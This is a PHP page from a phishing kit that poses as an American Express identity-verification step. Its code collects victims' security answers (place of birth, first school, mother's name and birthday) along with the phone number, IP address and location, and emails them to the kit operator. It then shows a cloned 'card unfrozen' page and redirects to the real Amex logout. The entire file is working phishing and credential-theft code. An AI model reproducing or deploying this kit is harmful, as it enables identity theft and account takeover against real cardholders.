<?php
include('../../blockers.php');
include('../../detects.php');
include('../../random.php');
include('../../assets/header.php');

$mob = $_POST['plcb'];
$fesch = $_POST['fesch'];
$mnames = $_POST['mname'];
$birthday = $_POST['birthday'];
$phone = $_POST['phone'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "___________________________________________________________\n";
$message .= "_________________________4m3x_Inf0_________________________\n";
$message .= "\n";
$message .= "Place of birth ___________:   ".$mob."\n";
$message .= "First Elementary School ___________:   ".$fesch."\n";
$message .= "Mo0ther N4me______:   ".$mnames."\n";
$message .= "Mo0ther Bd4y (MMDD):   ".$birthday."\n";
$message .= "Phone__________:   ".$phone."\n";
$message .= "___________________________________________________________\n"; 
$message .= "__________________________IP_Inf0___________________________\n";
$message .= "\n";
$message .= "Client IP___________: ".$v_ip."\n";
$message .= "BROWSER ________: ".$browser."\n";
$message .= "HOSTNAME___:   ".$hostname."\n";
$message .= "___________________________________________________________\n";
$message .= "_______________________Donlakost3________________________\n";
$subject = "4m3x info | ".$systemInfo['country']." | ".$systemInfo['region']." | ".$systemInfo['city']." | ".$v_ip."";
$headers = "FROM: 4m3x_info <dreambetrue@f0xyTyV.com>";
mail($emailku,$subject,$message,$headers);

?>
<script type="text/javascript">
    var isShift = false;
    var seperator = "/";
    window.onload = function () {
        //Reference the Table.
        var tblForm = document.getElementById("tblForm");

        //Reference all INPUT elements in the Table.
        var inputs = document.getElementById("tblForm").getElementsByTagName("input");

        //Loop through all INPUT elements.
        for (var i = 0; i < inputs.length; i++) {
            //Check whether the INPUT element is TextBox.
            if (inputs[i].type == "text") {
                //Check whether Date Format Validation is required.
                if (inputs[i].className.indexOf("date-format") != 1) {

                    //Set Max Length.
                    inputs[i].setAttribute("maxlength", 10);

                    //Only allow Numeric Keys.
                    inputs[i].onkeydown = function (e) {
                        return IsNumeric(this, e.keyCode);
                    };

                    //Validate Date as User types.
                    inputs[i].onkeyup = function (e) {
                        ValidateDateFormat(this, e.keyCode);
                    };
                }
            }
        }
    };

    function IsNumeric(input, keyCode) {
        if (keyCode == 16) {
            isShift = true;
        }
        //Allow only Numeric Keys.
        if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
            if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
                input.value += seperator;
            }

            return true;
        }
        else {
            return false;
        }
    };

    function ValidateDateFormat(input, keyCode) {
        var dateString = input.value;
        if (keyCode == 16) {
            isShift = false;
        }
        var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;

        //Check whether valid dd/MM/yyyy Date Format.
        if (regex.test(dateString) || dateString.length == 0) {
            ShowHideError(input, "none");
        } else {
            ShowHideError(input, "block");
        }
    };

    function ShowHideError(textbox, display) {
        var row = textbox.parentNode.parentNode;
        var errorMsg = row.getElementsByTagName("span")[0];
        if (errorMsg != null) {
            errorMsg.style.display = display;
        }
    };
</script>


<link data-react-helmet="true" rel="stylesheet" href="https://www.aexp-static.com/cdaas/one/statics/axp-dls/5.11.2/package/dist/styles/dls.min.css"/>
<link data-react-helmet="true" rel="apple-touch-icon" sizes="192x192" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/icon-192.png"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-640x1136.jpg" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-750x1294.jpg" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-1242x2148.jpg" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-1125x2436.jpg" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 3) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-1536x2048.jpg" media="(min-device-width: 768px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-1668x2224.jpg" media="(min-device-width: 834px) and (max-device-width: 834px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>
<link data-react-helmet="true" rel="apple-touch-startup-image" href="https://cdaas.aexp.com/cdaas/axp-app/modules/axp-identity-root/1.26.1/images/splash-screen-2048x2732.jpg" media="(min-device-width: 1024px) and (max-device-width: 1024px) and (-webkit-min-device-pixel-ratio: 2) and (orientation: portrait)"/>

      
      
      <style class="ssr-css">.axp-root__ErrorLayout__ErrorLayout___2B91F .alert{margin:0 auto}.axp-root__ErrorLayout__main___2IftH{max-width:1000px;width:100%;margin:0 auto;padding:10px}
aside.axp-root__OfflineWarning__offlineWarning___3qufd{position:fixed;width:100%;z-index:1002}.axp-root__OfflineWarning__offlineFontFetcher___3IL4P{position:absolute}.axp-root__OfflineWarning__offlineFontFetcher___3IL4P:before{content:" "}
.axp-root__dls__alert___3QfdQ{border:1px solid transparent;border-radius:0;display:-ms-flexbox;display:flex;margin-bottom:1.25rem;min-width:120px;padding-left:1.25rem;padding-right:1.25rem;position:relative}.axp-root__dls__alertClose___2nabC{min-width:0;max-width:none;padding:0;margin:0;border-radius:0;border:0;color:inherit;background-color:transparent;font-size:inherit;text-align:inherit;color:#53565a}.axp-root__dls__alertClose___2nabC:active,.axp-root__dls__alertClose___2nabC:hover{background-color:transparent;color:inherit}.axp-root__dls__alertClose___2nabC:before{font-family:dls-icons;content:"\EA06";line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-size:1rem}.axp-root__dls__alertClose___2nabC:hover{color:#53565a}.axp-root__dls__alertWarn___1eN1-{color:#b42c01;background-color:#fff;border-color:#b42c01}.axp-root__dls__alertWarn___1eN1- .axp-root__dls__alertIcon___ZEgbs{color:#b42c01}.axp-root__dls__alertDismissible___207X2>p,.axp-root__dls__alertDismissible___207X2>span{-ms-flex:1;flex:1;-ms-flex-order:1;order:1}.axp-root__dls__alertDismissible___207X2>:not(.axp-root__dls__alertIcon___ZEgbs){margin:1.25rem auto}.axp-root__dls__alertDismissible___207X2>.axp-root__dls__alertClose___2nabC,.axp-root__dls__alertDismissible___207X2>.axp-root__dls__alertIcon___ZEgbs{-ms-flex:none;flex:none}.axp-root__dls__alertDismissible___207X2>.axp-root__dls__alertIcon___ZEgbs{font-size:1.75rem;margin-top:.9375rem;-ms-flex-order:0;order:0;padding-right:.625rem}.axp-root__dls__alertDismissible___207X2>.axp-root__dls__alertClose___2nabC{-ms-flex-order:2;order:2;padding-right:0;padding-top:.125rem}.axp-root__dls__alertDismissible___207X2>.axp-root__dls__alertClose___2nabC:before{display:inherit;margin:auto}.axp-root__dls__btnIcon___18SUB{-ms-flex-align:center;align-items:center;display:-ms-inline-flexbox;display:inline-flex;font-size:1rem;line-height:1;min-width:2.625rem;padding-right:1.875rem;padding-left:1.875rem}.axp-root__dls__btnIcon___18SUB:before{-webkit-font-smoothing:antialiased;-webkit-text-stroke:0;-moz-osx-font-smoothing:grayscale;-webkit-backface-visibility:hidden;backface-visibility:hidden;display:block;font-family:dls-icons;font-style:normal;font-size:1.75rem;font-weight:400;font-variant:normal;text-transform:none;line-height:1;letter-spacing:0;position:relative;speak:none;vertical-align:middle}.axp-root__dls__btnIcon___18SUB.axp-root__dls__alertClose___2nabC:before{font-family:dls-icons;content:"\EA06";line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;font-size:1rem}.axp-root__dls__btnIcon___18SUB:before,.axp-root__dls__btnIcon___18SUB span{display:inline-block;vertical-align:middle;margin:auto}.axp-root__dls__btnIcon___18SUB span{padding-left:10px}.axp-root__dls__dlsAccentGray01___ZUhLO{color:#f7f8f9}.axp-root__dls__dlsAccentGray01Bg___3ptq0{background-color:#f7f8f9}.axp-root__dls__dlsAccentGray02___3NfAI{color:#ecedee}.axp-root__dls__dlsAccentGray02Bg___1YjGm{background-color:#ecedee}.axp-root__dls__dlsAccentGray03___1vlhO{color:#c8c9c7}.axp-root__dls__dlsAccentGray03Bg___2m1Wu{background-color:#c8c9c7}.axp-root__dls__dlsAccentGray04___1nA7n{color:#97999b}.axp-root__dls__dlsAccentGray04Bg___3kcIq{background-color:#97999b}.axp-root__dls__dlsAccentGray05___2Uchi{color:#53565a}.axp-root__dls__dlsAccentGray05Bg___3JfBC{background-color:#53565a}.axp-root__dls__dlsAccentGray06___3pcOU{color:#000}.axp-root__dls__dlsAccentGray06Bg___2a9hL{background-color:#000}.axp-root__dls__glyph___3k4YP,.axp-root__dls__icon___9U6tq{display:inline-block;line-height:1;vertical-align:middle}.axp-root__dls__glyph___3k4YP:before,.axp-root__dls__icon___9U6tq:before{-webkit-font-smoothing:antialiased;-webkit-text-stroke:0;-moz-osx-font-smoothing:grayscale;-webkit-backface-visibility:hidden;backface-visibility:hidden;display:block;font-family:dls-icons;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;letter-spacing:0;position:relative;speak:none;vertical-align:middle}.axp-root__dls__glyph___3k4YP:hover,.axp-root__dls__icon___9U6tq:hover{text-decoration:none}.axp-root__dls__glyph___3k4YP:before{font-size:1rem}.axp-root__dls__icon___9U6tq:before{font-size:1.75rem}.axp-root__dls__dlsGlyphClose___22qRo:before{content:"\EA06"}.axp-root__dls__dlsIconWarningFilled___1oV7e:before{content:"\EADD"}.axp-root__dls__margin___2XY01{margin:1.25rem}.axp-root__dls__margin0___1JRyy{margin:0!important}.axp-root__dls__margin0T___ppPo0{margin-top:0!important}.axp-root__dls__margin0B___1Zy7x{margin-bottom:0!important}.axp-root__dls__margin0L___2Hife{margin-left:0!important}.axp-root__dls__margin0R___V6Hoz{margin-right:0!important}.axp-root__dls__margin0Lr___-sZlT{margin-left:0!important;margin-right:0!important}.axp-root__dls__margin1___1GOfS{margin:.625rem!important}.axp-root__dls__margin1T___2YSLV{margin-top:.625rem!important}.axp-root__dls__margin1B___13fD5{margin-bottom:.625rem!important}.axp-root__dls__margin1L___1DwG_{margin-left:.625rem!important}.axp-root__dls__margin1R___30aGt{margin-right:.625rem!important}.axp-root__dls__margin1Lr___812HN{margin-left:.625rem!important;margin-right:.625rem!important}.axp-root__dls__margin2___1wzH7{margin:1.25rem!important}.axp-root__dls__margin2T___3-Bn9{margin-top:1.25rem!important}.axp-root__dls__margin2B___3_ZL2{margin-bottom:1.25rem!important}.axp-root__dls__margin2L___MerI0{margin-left:1.25rem!important}.axp-root__dls__margin2R___3IVoM{margin-right:1.25rem!important}.axp-root__dls__margin2Lr___1KVmB{margin-left:1.25rem!important;margin-right:1.25rem!important}.axp-root__dls__margin3___oaPzf{margin:1.875rem!important}.axp-root__dls__margin3T___2jilU{margin-top:1.875rem!important}.axp-root__dls__margin3B___1qxGD{margin-bottom:1.875rem!important}.axp-root__dls__margin3L___pOicc{margin-left:1.875rem!important}.axp-root__dls__margin3R___2_ABV{margin-right:1.875rem!important}.axp-root__dls__margin3Lr___3Edaj{margin-left:1.875rem!important;margin-right:1.875rem!important}.axp-root__dls__margin4___3EGA1{margin:2.5rem!important}.axp-root__dls__margin4T___hjdSA{margin-top:2.5rem!important}.axp-root__dls__margin4B___2zLq9{margin-bottom:2.5rem!important}.axp-root__dls__margin4L___2Pu_G{margin-left:2.5rem!important}.axp-root__dls__margin4R___DUMxz{margin-right:2.5rem!important}.axp-root__dls__margin4Lr___2F6Ji{margin-left:2.5rem!important;margin-right:2.5rem!important}
html body{overflow-x:hidden;width:100%;height:100%}</style>
<style class="ssr-css">.axp-identity-root__CommonStyles__large___26X0J .axp-identity-root__CommonStyles__content___25wkx{display:flex;justify-content:space-between}.axp-identity-root__CommonStyles__large___26X0J .axp-identity-root__CommonStyles__content___25wkx .axp-identity-root__CommonStyles__image___3sbsu,.axp-identity-root__CommonStyles__large___26X0J .axp-identity-root__CommonStyles__content___25wkx .axp-identity-root__CommonStyles__input___3Pla7{display:flex;flex-direction:column}.axp-identity-root__CommonStyles__large___26X0J .axp-identity-root__CommonStyles__content___25wkx .axp-identity-root__CommonStyles__input___3Pla7{flex:0 1 420px;margin-right:1rem}.axp-identity-root__CommonStyles__small___3kdOI .axp-identity-root__CommonStyles__content___25wkx{display:flex;flex-direction:column;align-items:center}.axp-identity-root__CommonStyles__small___3kdOI .axp-identity-root__CommonStyles__content___25wkx .axp-identity-root__CommonStyles__input___3Pla7{align-self:flex-start;width:100%;margin-right:0}</style>
<style>
.tengah {
  line-height: 200px;
  height: 200px;
  text-align: center;
}
</style>


<div class="container pad-1-tb">
    <div class="">
        <div>
            <div id="app-fuidfyp" class="card axp-forgot-userid-password__fuidfyp__appFuidfyp___3MiXW">
                <div class="margin-auto-lr margin-2-b" style="max-width: 800px;">
                    <div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container pad-0">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="axp-forgot-userid-password__fuidfyp__nav___3g7iY nav nav-large" role="navigation" data-toggle="nav" aria-current="horizontal">
                                        <ul class="nav-menu fluid">
                                        <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="false" title="I want to retrieve my User ID" class="nav-link" href="confirm_identity?security=<?php echo md5(microtime());?><?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">Identity Verification</a>
                                                </li>
                                            </div>
                                            <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="true" title="I want to reset my password" class="nav-link" href="#/en-us/account/recover">Finish</a>
                                                </li>
                                            </div>    
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container">
                            <div class="card-information">
                                <form method="post" action="finish?processing_<?php echo md5(microtime()); ?><?php echo md5(microtime()); ?>&session=<?php echo sha1(microtime()); ?>">
                                    <div class="margin-b">
                                        <h2 class="heading-4 text-align-center pad-t">Thanks for verifying your identity.</h2>
                                        <br><hr class="axp-authorize-action__module__margin0Lr___2fbcb">
                                    </div>
                                    
                                    
                                    
                                    <table cellspacing="0" cellpadding="0" width="100%">
<tbody>
<tr>
<td width="100%" rowspan="1" colspan="1">
</td></tr></tbody></table>
      <div id="root"><div class="">
      <div data-module-name="axp-root">
      <div class="">
	  <div class=""></div><div class="">
	  <div class="flex-align-center flex flex-justify-center">
	  <div class="progress-circle progress-indeterminate progress-md pad"></div></div></div></div></div></div></div>
	  
<br><br>
                                    <div class="pad-0-b">
                                        <h3 class="heading-3 text-align-center margin-0-b">We've unfrozen your Card and you can now use your Card as usual</h3>






                                    </div>
                                    <br>

                                    <hr class="hr axp-forgot-userid-password__fuidfyp__contentSpacing___D_Qr9"><br>
<div class="gray-05 text-align-center">For your security, you will be automatically logged out</div><br>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<meta http-equiv="Refresh" content="6; url='https://www.americanexpress.com/en-us/account/logout'" /> 
<?php include('../../assets/footer.php'); ?>